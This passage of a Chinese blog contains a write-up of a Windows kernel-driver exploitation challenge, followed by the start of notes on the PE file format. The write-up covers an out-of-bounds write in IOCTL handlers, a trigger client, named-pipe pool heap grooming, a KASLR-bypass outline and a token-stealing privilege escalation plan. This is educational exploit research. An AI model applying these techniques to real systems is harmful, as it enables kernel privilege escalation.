<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222000</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Create\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400051DC</span>();</span><br><span class="line">  <span class="keyword">goto</span> LABEL_16;</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400051DC</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// ebx</span></span><br><span class="line">  PVOID PoolWithTag; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  PoolWithTag = Destination;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination )</span><br><span class="line">  &#123;</span><br><span class="line">    PoolWithTag = <span class="built_in">ExAllocatePoolWithTag</span>((POOL_TYPE)<span class="number">512</span>, <span class="number">0x400</span>ui64, <span class="number">0x6963754C</span>u); </span><br><span class="line">    Destination = PoolWithTag;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">if</span> ( !PoolWithTag )</span><br><span class="line">    v0 = <span class="number">0xC0000017</span>;</span><br><span class="line">  <span class="built_in">RtlZeroMemory</span>(PoolWithTag, <span class="number">0</span>i64, <span class="number">1024</span>i64);</span><br><span class="line">  <span class="keyword">return</span> v0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ADD: system buffer 是我们传递的参数，可以看出来是个赋值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222004</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;ADD\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	v11 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">	v13 = *(_OWORD *)SystemBuffer;          <span class="comment">// SystemBuffer</span></span><br><span class="line">	v14 = v11;</span><br><span class="line">	v8 = <span class="built_in">sub_140001028</span>(&amp;v13);</span><br><span class="line">	<span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_140001028</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line"></span><br><span class="line">  result = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">0xDADADDAA</span>i64 )</span><br><span class="line">    result = <span class="number">0xC0000022</span>i64;</span><br><span class="line">  *((_QWORD *)Destination + *a1) = a1[<span class="number">2</span>];</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>GET：读取内容</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222008</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;GET\n&quot;</span>);</span><br><span class="line">  <span class="keyword">if</span> ( SystemBuffer &amp;&amp; OutputBufferLength &gt;= <span class="number">0x18</span> &amp;&amp; InputBufferLength &gt;= <span class="number">0x18</span> )</span><br><span class="line">  &#123;</span><br><span class="line">	v9 = SystemBuffer[<span class="number">2</span>];</span><br><span class="line">	v13 = *(_OWORD *)SystemBuffer;</span><br><span class="line">	v14 = v9;</span><br><span class="line">	v8 = <span class="built_in">sub_14000107C</span>(&amp;v13);</span><br><span class="line">	v10 = v14;</span><br><span class="line">	*(_OWORD *)SystemBuffer = v13;</span><br><span class="line">	SystemBuffer[<span class="number">2</span>] = v10;</span><br><span class="line">	a2-&gt;IoStatus.Information = <span class="number">24</span>i64;</span><br><span class="line">	<span class="keyword">goto</span> LABEL_16;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_14000107C</span><span class="params">(_QWORD *a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// edx</span></span><br><span class="line"></span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">if</span> ( !Destination || a1[<span class="number">1</span>] != <span class="number">3671776682</span>i64 )</span><br><span class="line">    v1 = <span class="number">-1073741790</span>;</span><br><span class="line">  <span class="keyword">if</span> ( *a1 &lt; <span class="number">0x80</span>ui64 )</span><br><span class="line">  &#123;</span><br><span class="line">    a1[<span class="number">2</span>] = *((_QWORD *)Destination + *a1);</span><br><span class="line">    a1[<span class="number">1</span>] = <span class="number">3735928559</span>i64;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v1;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Release，free掉chunk</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x22200C</span>u:</span><br><span class="line">  <span class="built_in">DbgPrint</span>(<span class="string">&quot;Release\n&quot;</span>);</span><br><span class="line">  v8 = <span class="built_in">sub_1400010E0</span>();</span><br><span class="line"><span class="function">__int64 <span class="title">sub_1400010E0</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">if</span> ( Destination )</span><br><span class="line">    <span class="built_in">ExFreePoolWithTag</span>(Destination, <span class="number">0x6963754C</span>u);</span><br><span class="line">  Destination = <span class="number">0</span>i64;</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>漏洞点：ADD，有一个越界写。</p>
<p>WritePipe在内核态调用了</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="built_in">ExAllocatePoolWithTag</span>(NonpagedPoolNx, <span class="built_in">sizeof</span>(payload)+<span class="number">0x30</span>, tag)</span><br></pre></td></tr></table></figure>

<p>每次写pipe，内核态会添加一个<code>DATA_QUEUE_ENTRY</code>。</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_DATA_QUEUE_ENTRY</span>&#123;</span><br><span class="line">    LIST_ENTRY Queue;        <span class="comment">// 双向链表</span></span><br><span class="line">    _IRP* Irp;</span><br><span class="line">    __int64 SecurityContext;</span><br><span class="line">    <span class="type">int</span> EntryType;</span><br><span class="line">    <span class="type">int</span> QuotaInEntry;</span><br><span class="line">    <span class="type">int</span> DataSize;           <span class="comment">// 不包含元数据</span></span><br><span class="line">    <span class="type">int</span> x;</span><br><span class="line">&#125; DATA_QUEUE_ENTRY,*PDATA_QUEUE_ENTRY;</span><br></pre></td></tr></table></figure>

<p>存在一点Debug信息，我们先查看获得对象的大小：0x440, 同时 <code>!pool</code>命令显示 pool header地址</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; lm m Luc*</span><br><span class="line">Browse full module list</span><br><span class="line"><span class="built_in">start</span>             end                 module name</span><br><span class="line">fffff800`<span class="number">40</span>b70000 fffff800`<span class="number">40</span>b78000   Lucifer    (deferred)             </span><br><span class="line"><span class="number">0</span>: kd&gt; ba e1 fffff800`<span class="number">40</span>b70000+<span class="number">0</span>x5200</span><br><span class="line"><span class="number">0</span>: kd&gt; g</span><br><span class="line"></span><br><span class="line"><span class="number">1</span>: kd&gt; p</span><br><span class="line">Lucifer+<span class="number">0</span>x5206:</span><br><span class="line">fffff800`<span class="number">40</span>b75206 <span class="number">48890513</span>deffff  mov     qword ptr [Lucifer+<span class="number">0</span>x3020 (fffff800`<span class="number">40</span>b73020)],rax</span><br><span class="line"><span class="number">1</span>: kd&gt; r rax</span><br><span class="line">rax=ffff9a882f51c460</span><br><span class="line"><span class="number">1</span>: kd&gt; !pool ffff9a882f51c460</span><br><span class="line">Pool page ffff9a882f51c460 region is Nonpaged pool</span><br><span class="line"> ffff9a882f51c000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  RLin</span><br><span class="line">*ffff9a882f51c450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff9a882f51c8b0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  Viaa</span><br><span class="line"> ffff9a882f51cd10 size:  <span class="number">220</span> previous size:    <span class="number">0</span>  (Allocated)  AleP</span><br><span class="line"> ffff9a882f51cf30 size:   b0 previous size:    <span class="number">0</span>  (Free)       Y..=</span><br></pre></td></tr></table></figure>

<p>往里面写0x400个内容，0x440 &#x3D; 0x10 pool header + 0x400 chunk + 0x30 padding</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">0</span>: kd&gt; !pool FFFFA489243E4A20</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffffa489243e4a20 region is Nonpaged pool</span><br><span class="line"> ffffa489243e4000 size:  a00 previous size:    <span class="number">0</span>  (Allocated)  Thre</span><br><span class="line">*ffffa489243e4a10 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : <span class="built_in">Unknown</span> (update pooltag.txt)</span><br><span class="line"> ffffa489243e4e50 size:  <span class="number">190</span> previous size:    <span class="number">0</span>  (Free)       .l.:</span><br><span class="line"></span><br><span class="line"><span class="number">0</span>: kd&gt; dq FFFFA489243E4A20 L88</span><br><span class="line">ffffa489`<span class="number">243e4</span>a20  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line"># ...</span><br><span class="line">ffffa489`<span class="number">243e4</span>e10  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`deadbeef</span><br><span class="line">ffffa489`<span class="number">243e4</span>e20  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e30  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e40  <span class="number">00000000</span>`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">00000000</span></span><br><span class="line">ffffa489`<span class="number">243e4</span>e50  ba816c05`<span class="number">08f</span>395a9 <span class="number">00000000</span>`<span class="number">00000000</span></span><br></pre></td></tr></table></figure>

<p>用于调试</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	HANDLE hDevice;</span><br><span class="line">	DWORD dwRet;</span><br><span class="line">	BOOL stat;</span><br><span class="line">	hDevice = <span class="built_in">CreateFileW</span>(</span><br><span class="line">		DEVICE_NAME,</span><br><span class="line">		GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">		<span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>,</span><br><span class="line">		OPEN_EXISTING,</span><br><span class="line">		FILE_ATTRIBUTE_NORMAL,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (hDevice == INVALID_HANDLE_VALUE)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error CreateFileW&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">		<span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">	&#125;</span><br><span class="line">	stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hDevice,</span><br><span class="line">		<span class="number">0x222000</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;dwRet,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="keyword">if</span> (!stat)</span><br><span class="line">	&#123;</span><br><span class="line">		std::cout &lt;&lt; <span class="string">&quot;[-] Error DeviceIoControl&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="comment">// ADD</span></span><br><span class="line">	UINT64 data[<span class="number">3</span>];</span><br><span class="line">	data[<span class="number">1</span>] = <span class="number">0xDADADDAA</span>;</span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">0x80</span>; i++) &#123;</span><br><span class="line">		data[<span class="number">0</span>] = i;</span><br><span class="line">		data[<span class="number">2</span>] = <span class="number">0xdeadbeef</span>;</span><br><span class="line">		stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">			hDevice,</span><br><span class="line">			<span class="number">0x222004</span>,</span><br><span class="line">			&amp;data, <span class="built_in">sizeof</span>(data),</span><br><span class="line">			<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">			&amp;dwRet,</span><br><span class="line">			<span class="literal">NULL</span></span><br><span class="line">		);</span><br><span class="line">	&#125;</span><br><span class="line">	std::cout &lt;&lt; <span class="string">&quot;[+] ADD Done&quot;</span> &lt;&lt; std::endl;</span><br><span class="line">	<span class="built_in">getchar</span>();</span><br><span class="line">	<span class="comment">// release</span></span><br><span class="line">	stat = <span class="built_in">DeviceIoControl</span>(</span><br><span class="line">		hDevice,</span><br><span class="line">		<span class="number">0x22200</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		<span class="literal">NULL</span>, <span class="number">0</span>,</span><br><span class="line">		&amp;dwRet,</span><br><span class="line">		<span class="literal">NULL</span></span><br><span class="line">	);</span><br><span class="line">	<span class="built_in">CloseHandle</span>(hDevice);</span><br><span class="line">	<span class="keyword">return</span> EXIT_SUCCESS;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>布局堆风水</p>
<p>一种堆喷方式：切割</p>
<ul>
<li>两个chunk: 0x800 + 0x7c0</li>
<li>0x800 切割成一个漏洞对象，另一个是pipe</li>
<li>概率出现想要的风水</li>
</ul>
<p>还可以使用论文中的方式</p>
<ul>
<li>首先,分配上千个选中大小的块,以确保首先清空FreeChunkTree中所有大于所选大小的块.</li>
<li>然后,分配器将分配0x10000字节的新VS字段,并将其放入FreeChunkTree.</li>
<li>然后再分配几千个分块,这些分块最终会进入新的大空闲分块,因此是连续的,然后释放最后分配的块的3分之1,用于填充FreeChunkTree,只是放3分之1将确保不会有数据块合并,最后重新分配已释放的数据块,以最大限度增加喷射机会.</li>
</ul>
<p>理想是得到这样的堆布局</p>
<figure class="highlight cmd"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; !pool FFFF8981621A6010</span><br><span class="line">unable to get nt!PspSessionIdBitmap</span><br><span class="line">Pool page ffff8981621a6010 region is Nonpaged pool</span><br><span class="line">*ffff8981621a6000 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated) *Luci</span><br><span class="line">		Owning component : Unknown (update pooltag.txt)</span><br><span class="line"> ffff8981621a6450 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br><span class="line"> ffff8981621a68a0 size:  <span class="number">440</span> previous size:    <span class="number">0</span>  (Allocated)  NpFr Process: ffff898162043080</span><br></pre></td></tr></table></figure>


<p>查看pipe，header</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">4</span>: kd&gt; dq ffff8981621a6450</span><br><span class="line">ffff8981`<span class="number">621</span>a6450  <span class="number">7246704</span>e`<span class="number">0</span>a446f00 f7ca3fb8`<span class="number">9f</span>7f4811</span><br><span class="line">ffff8981`<span class="number">621</span>a6460  ffffcc05`<span class="number">0f</span>d259b8 ffffcc05`<span class="number">0f</span>d259b8</span><br><span class="line">ffff8981`<span class="number">621</span>a6470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffcc05`<span class="number">10</span>a100f0</span><br><span class="line">ffff8981`<span class="number">621</span>a6480  <span class="number">000003</span>d0`<span class="number">00000000</span> <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8981`<span class="number">621</span>a6490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8981`<span class="number">621</span>a64c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure>

<p>越界写入</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="number">1</span>: kd&gt; dq ffff8387c055d450</span><br><span class="line">ffff8387`c055d450  <span class="number">7246704</span>e`<span class="number">0</span>a440000 <span class="number">330b</span>b4ed`<span class="number">16b</span>fc9f1</span><br><span class="line">ffff8387`c055d460  ffffc288`<span class="number">07372b</span>d8 ffffc288`<span class="number">07372b</span>d8</span><br><span class="line">ffff8387`c055d470  <span class="number">00000000</span>`<span class="number">00000000</span> ffffc288`<span class="number">05794910</span></span><br><span class="line">ffff8387`c055d480  <span class="number">00000000</span>`deadbeef <span class="number">00000000</span>`<span class="number">000003</span>d0</span><br><span class="line">ffff8387`c055d490  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4a0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4b0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br><span class="line">ffff8387`c055d4c0  <span class="number">43434343</span>`<span class="number">43434343</span> <span class="number">43434343</span>`<span class="number">43434343</span></span><br></pre></td></tr></table></figure>

<p>读取pipe而且不free掉chunk，可以使用</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">BOOL <span class="title">PeekNamedPipe</span><span class="params">(</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            HANDLE  hNamedPipe,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPVOID  lpBuffer,</span></span></span><br><span class="line"><span class="params"><span class="function">  [in]            DWORD   nBufferSize,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesRead,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpTotalBytesAvail,</span></span></span><br><span class="line"><span class="params"><span class="function">  [out, optional] LPDWORD lpBytesLeftThisMessage</span></span></span><br><span class="line"><span class="params"><span class="function">)</span></span>;</span><br></pre></td></tr></table></figure>

<p>修改DataSize越界读取，泄露nt的基址，从而可以bypass kaslr</p>
<ul>
<li>Page segment &#x3D; PipeQueueEntry &amp; 0xfffffffffff00000 (Segment mask) </li>
<li>Signature of Page segment &#x3D; readmem(Page segment + 0x10) </li>
<li>Segcontext &#x3D; (Page segment) ^ (Signature of Page segment) ^ RtlpHpHeapGlobals.HeapKey ^ 0xA2E64EADA2E64EAD </li>
<li>Segment heap &#x3D; Segcontext - 0x100</li>
<li>callback function: Segment heap-&gt;VsContext，RtlpHpHeapGlobals.HeapKey ^ encode data ^ VsContext address</li>
</ul>
<p>任意地址读取：EntryType 为unbuffer时可以读取Irp，而这个Irp可以伪造</p>
<p>提权：我们可以读取system的token值，然后根据驱动的任意写写入当前进程</p>
<h3 id="API-前缀"><a href="#API-前缀" class="headerlink" title="API 前缀"></a>API 前缀</h3><p>代表着Windows native（原生）系统服务（system services）例程（routines）。  </p>
<p>Ke － kernel的缩写，代表的是内核模式的API接口。  </p>
<p>Nt － Windows New Technology的缩写，代表的是 Windows 系统服务功能API接口。 大部分以Nt开头的函数，都映射到了用户态（User Mode）API接口。比如你编写的用户模式程序，用到了CreateFile这个函数，由于它需要访问系统内部的数据结构，必须要进入内核模式，这时的程序就要转入内核模式，相对应的内核模式功能服务接口，正是ntdll.dll中的NtCreateFile，它最终完成来自用户态程序的函数功能请求。  </p>
<p>Zw － 没有具体的缩写含义，只是为了避免和其它前缀的重复。它的功能和与之相对应的Nt函数是一致的（可以说是Nt功能的镜像）。 不同点在于： 相应的Nt函数，是对系统服务的直接；而Zw需要经过一系列系统准备动作，比如：系统服务码入寄存器保存，系统KiSystemService加载，然后才执行具体的服务功能调用。 看着负担加重了，但好处是，在执行时，系统参数的系列校验不必再进行了（拜所谓的previous access mode之赐），所以反而轻快了；而Nt系列函数虽然调用时简洁，但每一次执行都要参数校验，因此反而累赘了。这也正是内核态程序（比如驱动程序）多用Zw系统的原因（因为需要和previous mode打交道）。</p>
<h3 id="reference"><a href="#reference" class="headerlink" title="reference"></a>reference</h3><ul>
<li><a href="https://exploitreversing.com/2023/04/11/exploiting-reversing-er-series/">Exploiting Reversing (ER) series: article 01 – Exploit Reversing</a></li>
<li><a href="https://exploitreversing.com/2024/01/03/exploiting-reversing-er-series-article-02/">Exploiting Reversing (ER) series: article 02 – Exploit Reversing</a></li>
<li><a href="https://www.slideshare.net/">Share &amp; Discover Presentations</a></li>
<li><a href="https://www.vergiliusproject.com/">windows undocumented structure: vergilius project</a></li>
<li><a href="http://windbg.info/doc/1-common-cmds.html">Windbg command: WinDbg.info</a></li>
</ul>
]]></content>
      <categories>
        <category>CSE</category>
      </categories>
      <tags>
        <tag>Windows</tag>
      </tags>
  </entry>
  <entry>
    <title>C++逆向</title>
    <url>/2024/01/19/C++%E9%80%86%E5%90%91/</url>
    <content><![CDATA[<blockquote>
<p>什么？对象，虚？</p>
</blockquote>
<span id="more"></span>

<h2 id="PE-文件格式"><a href="#PE-文件格式" class="headerlink" title="PE 文件格式"></a>PE 文件格式</h2><blockquote>
<p>为什么会有这个？逆向为什么没有这个！</p>
</blockquote>
<p>微软官方文档：<a href="https://learn.microsoft.com/zh-cn/windows/win32/debug/pe-format">PE 格式 - Win32 apps</a></p>
<p>使用 010editor 查看。需要先下载插件：模板-&gt;模板库-&gt;安装 exe.bt 。alt+4 可以查看PE文件格式</p>
<h3 id="DOS-头"><a href="#DOS-头" class="headerlink" title="DOS 头"></a>DOS 头</h3><p>两个重要的变量 <code>e_magic</code>(判断是否为DOS头，固定为<code>5a4d</code>) 和 <code>e_lfanew</code>(NT头的偏移) </p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DOS_HEADER</span> &#123;      <span class="comment">// DOS .EXE header</span></span><br><span class="line">    WORD   e_magic;                     <span class="comment">// Magic number</span></span><br><span class="line">    WORD   e_cblp;                      <span class="comment">// Bytes on last page of file</span></span><br><span class="line">    WORD   e_cp;                        <span class="comment">// Pages in file</span></span><br><span class="line">    WORD   e_crlc;                      <span class="comment">// Relocations</span></span><br><span class="line">    WORD   e_cparhdr;                   <span class="comment">// Size of header in paragraphs</span></span><br><span class="line">    WORD   e_minalloc;                  <span class="comment">// Minimum extra paragraphs needed</span></span><br><span class="line">    WORD   e_maxalloc;                  <span class="comment">// Maximum extra paragraphs needed</span></span><br><span class="line">    WORD   e_ss;                        <span class="comment">// Initial (relative) SS value</span></span><br><span class="line">    WORD   e_sp;                        <span class="comment">// Initial SP value</span></span><br><span class="line">    WORD   e_csum;                      <span class="comment">// Checksum</span></span><br><span class="line">    WORD   e_ip;                        <span class="comment">// Initial IP value</span></span><br><span class="line">    WORD   e_cs;                        <span class="comment">// Initial (relative) CS value</span></span><br><span class="line">    WORD   e_lfarlc;                    <span class="comment">// File address of relocation table</span></span><br><span class="line">    WORD   e_ovno;                      <span class="comment">// Overlay number</span></span><br><span class="line">    WORD   e_res[<span class="number">4</span>];                    <span class="comment">// Reserved words</span></span><br><span class="line">    WORD   e_oemid;                     <span class="comment">// OEM identifier (for e_oeminfo)</span></span><br><span class="line">    WORD   e_oeminfo;                   <span class="comment">// OEM information; e_oemid specific</span></span><br><span class="line">    WORD   e_res2[<span class="number">10</span>];                  <span class="comment">// Reserved words</span></span><br><span class="line">    LONG   e_lfanew;                    <span class="comment">// File address of new exe header</span></span><br><span class="line">  &#125; IMAGE_DOS_HEADER, *PIMAGE_DOS_HEADER</span><br></pre></td></tr></table></figure>

<h3 id="DOS-stub"><a href="#DOS-stub" class="headerlink" title="DOS stub"></a>DOS stub</h3><p>MS-DOS 存根是在 <em>MS-DOS 下运行的有效应用程序</em>。 它放置在 EXE 映像的前面。 链接器在此处放置一个默认存根，当映像在 MS-DOS 中运行时，该存根输出消息“此程序无法在 DOS 模式下运行”。</p>
<h3 id="NT-头"><a href="#NT-头" class="headerlink" title="NT 头"></a>NT 头</h3><p><code>IMAGE_NT_HEADERS</code> 结构</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS64</span> &#123;</span><br><span class="line">    DWORD Signature;</span><br><span class="line">    IMAGE_FILE_HEADER FileHeader;</span><br><span class="line">    IMAGE_OPTIONAL_HEADER64 OptionalHeader;</span><br><span class="line">&#125; IMAGE_NT_HEADERS64, *PIMAGE_NT_HEADERS64;</span><br></pre></td></tr></table></figure>

<h4 id="签名"><a href="#签名" class="headerlink" title="签名"></a>签名</h4><p>签名是一个固定的值</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IMAGE_NT_SIGNATURE                  0x00004550  <span class="comment">// PE00</span></span></span><br></pre></td></tr></table></figure>

<h4 id="FileHeader"><a href="#FileHeader" class="headerlink" title="FileHeader"></a>FileHeader</h4><p>文件头包含了很多重要的属性</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">	WORD    Machine;					<span class="comment">// 取决于机器，ARM, x86...</span></span><br><span class="line">	WORD    NumberOfSections;			<span class="comment">// Section 数量</span></span><br><span class="line">	DWORD   TimeDateStamp;				<span class="comment">// 文件创建时间</span></span><br><span class="line">	DWORD   PointerToSymbolTable;		<span class="comment">// 指向符号表</span></span><br><span class="line">	DWORD   NumberOfSymbols;			<span class="comment">// 符号表中符号个数</span></span><br><span class="line">	WORD    SizeOfOptionalHeader;		<span class="comment">// 可选头的大小</span></span><br><span class="line">	WORD    Characteristics;			<span class="comment">// 文件属性，是否为DLL等</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, * PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure>

<h4 id="OptionalHeader"><a href="#OptionalHeader" class="headerlink" title="OptionalHeader"></a>OptionalHeader</h4><p>可选头</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER64</span> &#123;</span><br><span class="line">    WORD        Magic;                      <span class="comment">// 魔术字</span></span><br><span class="line">    BYTE        MajorLinkerVersion;         <span class="comment">// linker 版本号</span></span><br><span class="line">    BYTE        MinorLinkerVersion;     </span><br><span class="line">    DWORD       SizeOfCode;                </span><br><span class="line">    DWORD       SizeOfInitializedData;</span><br><span class="line">    DWORD       SizeOfUninitializedData;</span><br><span class="line">    DWORD       AddressOfEntryPoint;        <span class="comment">// 程序执行入口RVA</span></span><br><span class="line">    DWORD       BaseOfCode;                 <span class="comment">// 代码的节的起始RVA</span></span><br><span class="line">    ULONGLONG   ImageBase;                  <span class="comment">// 优先装载地址</span></span><br><span class="line">    DWORD       SectionAlignment;           <span class="comment">// 内存中的节的对齐</span></span><br><span class="line">    DWORD       FileAlignment;              <span class="comment">// 文件中的节的对齐</span></span><br><span class="line">    WORD        MajorOperatingSystemVersion;</span><br><span class="line">    WORD        MinorOperatingSystemVersion;</span><br><span class="line">    WORD        MajorImageVersion;</span><br><span class="line">    WORD        MinorImageVersion;</span><br><span class="line">    WORD        MajorSubsystemVersion;</span><br><span class="line">    WORD        MinorSubsystemVersion;</span><br><span class="line">    DWORD       Win32VersionValue;</span><br><span class="line">    DWORD       SizeOfImage;</span><br><span class="line">    DWORD       SizeOfHeaders;</span><br><span class="line">    DWORD       CheckSum;</span><br><span class="line">    WORD        Subsystem;</span><br><span class="line">    WORD        DllCharacteristics;         <span class="comment">// DLL文件特性</span></span><br><span class="line">    ULONGLONG   SizeOfStackReserve;</span><br><span class="line">    ULONGLONG   SizeOfStackCommit;</span><br><span class="line">    ULONGLONG   SizeOfHeapReserve;</span><br><span class="line">    ULONGLONG   SizeOfHeapCommit;</span><br><span class="line">    DWORD       LoaderFlags;                <span class="comment">// 与调试有关</span></span><br><span class="line">    DWORD       NumberOfRvaAndSizes;        <span class="comment">// 数据目录结构的项目数量</span></span><br><span class="line">    IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES];</span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER64, * PIMAGE_OPTIONAL_HEADER64;</span><br></pre></td></tr></table></figure>

